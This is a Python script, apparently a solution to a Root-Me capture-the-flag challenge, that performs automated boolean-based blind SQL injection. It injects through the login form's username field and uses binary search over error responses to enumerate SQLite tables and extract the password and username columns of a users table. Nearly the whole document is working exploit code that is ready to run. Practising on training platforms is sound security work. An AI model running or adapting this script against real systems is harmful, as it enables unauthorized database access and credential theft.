import requests
import itertools

url = "http://challenge01.root-me.org/web-serveur/ch10/"
params = {"password": "MEUH"}
inject_field = "username"
ERROR_WORD = "Error"
base = "admin' and {} --"

ORM = "sqlite"

ORM_payloads = {
    'sqlite': {
        'count': """SELECT COUNT(*) FROM {table} {filter}""",
        'size_field': """
SELECT LENGTH({column}) FROM {table} {filter}
LIMIT 1
OFFSET {n} """,
        'char_field': """
SELECT UNICODE(SUBSTR({column}, {{i}})) FROM {table} {filter}
LIMIT 1
OFFSET {n}"""
    }
}
compare_payload = "({payload}) {op} {n}"
base_compare = base.format(compare_payload)

BIGGER = 1
SMALLER = -1
EQUAL = 0


def check(payload):
    p = params.copy()
    p.update({inject_field: payload})
    r = requests.post(url, data=p)
    return ERROR_WORD not in r.text


def dichot(a, b, f):
    """
    a is min value
    b is max value
    f is a function that take an integer and which return
        BIGGER SMALLER or EQUAL
    """
    if a == b:
        return  # Didn't find anything
    if b - a == 1:  # Else, mid will stay to a
        mid = b
    else:
        mid = (a + b) // 2

    res = f(mid)
    if res == BIGGER:
        return dichot(mid, b, f)
    elif res == EQUAL:
        return mid
    elif res == SMALLER:
        return dichot(a, mid, f)


def gen_dichot_f(payload, what=""):
    def f(i):
        if(check(
            base_compare.format(payload=payload, op='>', n=i)
        )):
            return BIGGER
        if(check(
            base_compare.format(payload=payload, op='=', n=i)
        )):
            print("There is", i, what, "!")
            return EQUAL
        return SMALLER
    return f


def escape_string(s):
    return "CONCAT(CHR(" + \
            "), CHR(".join(str(ord(c)) for c in s) + \
            "))" if s else "NULL"


def get_columns(table_name, columns, filter=""):
    payload_count = ORM_payloads[ORM]['count'].format(table=table_name,
                                                      filter=filter)
    get_count = gen_dichot_f(payload_count)

    STEP = 150
    for i in itertools.count(0, STEP):
        count = dichot(i, i + STEP, get_count)
        if count is not None:
            break

    if isinstance(columns, str):
        columns = [columns]

    content = []
    for n in range(count):
        content.append(dict())
        for column in columns:
            payload_size_field = ORM_payloads[ORM]['size_field']\
                .format(table=table_name,
                        column=column,
                        filter=filter,
                        n=n)
            get_size_field = gen_dichot_f(payload_size_field)
            for i in itertools.count(0, STEP):
                size_field = dichot(i, i + STEP, get_size_field)
                if size_field is not None:
                    break

            payload_char_field_n = ORM_payloads[ORM]['char_field']\
                .format(table=table_name,
                        column=column,
                        filter=filter,
                        n=n)
            s = ""
            for i in range(1, size_field + 1):
                payload_char_field = payload_char_field_n.format(i=i)
                get_char_field = gen_dichot_f(payload_char_field)

                for j in itertools.count(0, STEP):
                    c = dichot(j, j + STEP, get_char_field)
                    if c is not None:
                        break
                s += chr(c)
            print(column, s)

            content[-1][column] = s
        print(content[-1])

    return content


if ORM == "sqlite":
    def get_table_list():
        return get_columns("sqlite_master",
                           "name",
                           "WHERE type='table'")

    def get_columns_name(table):
        return get_columns("sqlite_master",
                           "sql",
                           "WHERE name = {}".format(table))

print(get_table_list())
print(get_columns("users", ["password", "username", "Year"]))
